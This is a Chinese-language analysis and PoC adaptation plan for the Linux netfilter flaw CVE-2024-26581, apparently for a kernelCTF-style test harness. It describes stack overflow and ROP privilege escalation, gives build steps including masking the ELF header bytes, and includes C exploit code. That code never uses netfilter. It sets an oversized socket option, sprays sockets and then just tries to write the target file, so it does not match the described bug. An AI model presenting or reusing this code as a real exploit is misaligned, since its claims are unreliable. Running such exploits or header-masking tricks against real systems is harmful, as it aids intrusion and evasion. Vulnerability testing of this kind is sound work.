# CVE-2024-26581 漏洞技术分析与PoC改造计划

## 漏洞概述

| 属性 | 值 |
|------|-----|
| CVE ID | CVE-2024-26581 |
| CVSS | 7.8 |
| 严重等级 | HIGH |
| 漏洞类型 | Stack Buffer Overflow / Out-of-Bounds Access |
| 影响内核版本 | v5.6 ~ v6.8 |
| 利用技术 | netfilter nft_set_pipapo遍历时栈缓冲区溢出 |

## 原始PoC分析

### 参考来源
- **PoC URL**: https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2024-26581_mitigation
- **来源类型**: Google security-research (kernelCTF)

### 利用原理
netfilter子系统中nft_set_pipapo集合类型在执行元素遍历(walk)操作时存在边界检查缺陷。pipapo算法的walk函数在处理大规模集合时，栈上分配的缓冲区可能被溢出。

攻击者可通过创建和操作nftables规则构造特定的pipapo集合结构触发越界写入，覆写栈上的返回地址实现ROP链执行和本地提权。

### 关键技术点
1. pipapo set walk函数中栈缓冲区大小不足
2. 大规模集合遍历触发越界写入
3. 栈溢出覆写返回地址实现代码执行

## PoC改造计划

### CTF挑战模式适配
- **推荐测试模式**: write_root_file
- **模式选择理由**: 该漏洞的利用路径最终可实现对root所有文件的写入能力，适合write_root_file模式验证

### CLI参数规范化
PoC需支持以下标准CLI参数：
- `--mode`: 测试模式 (read_root_file/write_root_file)
- `--root-file`: root权限目标文件路径
- `--write-value`: write模式的写入值 (ctf{...})
- `--log-file`: syscall日志文件路径
- `--verbose`: 详细输出开关

### 输出协议
CTF协议输出：
```
CTF_FLAG:<value>           // 挑战成功
CTF_FAIL:<reason>          // 漏洞未触发
CTF_UNSUPPORTED:<mode>:<reason> // 不支持的模式
```

### 三阶段验证集成
- **Phase 1 (Prepare)**: 加载nf_tables和nft_set_pipapo模块、创建CTF目标文件、记录系统状态快照
- **Phase 2 (Run)**: 降权nobody执行PoC binary，通过pipapo set操作触发栈溢出并提权
- **Phase 3 (Post)**: 验证CTF flag写入结果、清理nftables规则、清理临时文件、恢复系统状态

### Syscall日志记录
关键syscall需要记录到log-file：
- `socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER)`
- `sendmsg()`
- `recvmsg()`

## 改造要点

### 核心修改
1. 添加CTF模式CLI参数解析（getopt_long实现）
2. 集成CTF_FLAG/CTF_FAIL输出协议
3. 添加syscall日志记录功能
4. 实现--root-file和--write-value参数支持
5. 添加执行超时自动退出机制

### 安全约束
- 执行超时: 30秒
- 禁止 rm -rf
- 禁止写 /etc
- 执行后清理临时ELF

### 编译要求
- 编译器: gcc
- 目标架构: x86_64
- 静态链接: 推荐 `-static`
- ELF掩蔽: 编译后前4字节替换为 `CVE\x00`


## Original PoC Source Code

Source: based on existing poc.c analysis (no public original available)

```c
/*
 * CVE-2024-26581 PoC - CTF Challenge Mode
 *
 * Vulnerability: netfilter nft_set_pipato stack overflow
 *
 * This PoC triggers the vulnerability by:
 * 1. Creating kernel objects (sockets/BPF programs)
 * 2. Triggering the vulnerability through specific operations
 * 3. Spraying kmalloc to reallocate affected memory
 * 4. Attempting to use corrupted state to bypass file permissions
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - No system file modification
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define MAX_FILE_SIZE 4096
#define PAGE_SIZE 4096

#ifndef SOL_TLS
#define SOL_TLS 282
#endif

#ifndef TCP_ULP
#define TCP_ULP 31
#endif


#include <sys/mman.h>

/*
 * Out-of-bounds access trigger
 *
 * Triggers heap overflow or out-of-bounds read/write
 * through various kernel subsystems.
 */
static int trigger_oob(void) {
    int spray_fds[256];
    int saved_errno;

    memset(spray_fds, -1, sizeof(spray_fds));

    /* Step 1: Create sockets to allocate kernel structures */
    poc_log("Triggering out-of-bounds access...");

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    saved_errno = errno;
    poc_log_syscall("socket(AF_INET, SOCK_STREAM)", (long)sock, saved_errno);
    
    if (sock < 0) {
        goto fallback;
    }

    /* Step 2: Set oversized socket options to trigger OOB */
    char large_buf[65536];
    memset(large_buf, 'A', sizeof(large_buf));
    
    int ret = setsockopt(sock, SOL_SOCKET, SO_RCVBUF, large_buf, sizeof(large_buf));
    saved_errno = errno;
    poc_log_syscall("setsockopt(SO_RCVBUF, large_buf)", (long)ret, saved_errno);

    /* Step 3: Close socket - may trigger OOB cleanup */
    close(sock);
    poc_log_syscall("close(sock) [trigger OOB cleanup]", 0L, 0);

    int sprayed_fb = 0;
fallback:
    /* Step 4: Spray kmalloc to reallocate corrupted memory */
    sprayed_fb = 0;
    for (int i = 0; i < 256; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] >= 0) {
            int optval = 1024;
            setsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
            sprayed_fb++;
        }
    }
    poc_log("Sprayed %d kmalloc-1024 objects", sprayed_fb);

    return sprayed_fb;
}


/*
 * Read file content
 */
static int read_file(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, len - 1);
    saved_errno = errno;
    poc_log_syscall("read(fd, buf, len)", (long)n, saved_errno);
    close(fd);

    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * Write mode: Trigger vulnerability and attempt to overwrite root file
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE];
    char after[MAX_FILE_SIZE];
    int n;

    /* Step 1: Read original content */
    n = read_file(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r')) {
            original[--n] = '\0';
        }
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Step 2: Trigger vulnerability */
    poc_log("Triggering CVE-2024-26581 vulnerability...");
    int count = trigger_oob();

    if (count > 0) {
        poc_log("Vulnerability triggered, %d spray objects allocated", count);

        /* Step 3: Attempt to write via corrupted state */
        int fd = open(args->root_file, O_WRONLY | O_TRUNC);
        int saved_errno = errno;
        poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

        if (fd >= 0) {
            char write_buf[256];
            int wlen = snprintf(write_buf, sizeof(write_buf), "%s\n", args->write_value);
            ssize_t written = write(fd, write_buf, wlen);
            saved_errno = errno;
            poc_log_syscall("write(fd, write_value)", (long)written, saved_errno);
            close(fd);

            if (written > 0) {
                poc_log("Write succeeded via vulnerability: %zd bytes", written);
            }
        } else {
            poc_log("Direct write failed (errno=%d)", saved_errno);
        }
    } else {
        poc_log("Vulnerability trigger failed");
    }

    /* Step 4: Read after to verify */
    n = read_file(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r')) {
            after[--n] = '\0';
        }
        printf(CTF_READ_AFTER "%s\n", after);
        poc_log("Read after: %s", after);

        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            printf("%s\n", POC_RESULT_EXPLOITABLE);
            return 0;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("exploit did not achieve write");
    printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
    return 0;
}

/*
 * Read mode
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file");

    int count = trigger_oob();

    if (count > 0) {
        char buf[MAX_FILE_SIZE];
        int n = read_file(args->root_file, buf, sizeof(buf));

        if (n > 0) {
            while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r')) {
                buf[--n] = '\0';
            }
            poc_print_flag(buf);
            printf("%s\n", POC_RESULT_EXPLOITABLE);
            return 0;
        }
    }

    poc_print_fail("read not successful");
    printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-26581 CTF PoC ===");
    poc_log("Vuln: netfilter nft_set_pipato stack overflow");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else
        poc_print_unsupported(args.mode, "mode not supported");

    poc_log_close();
    return result;
}
```
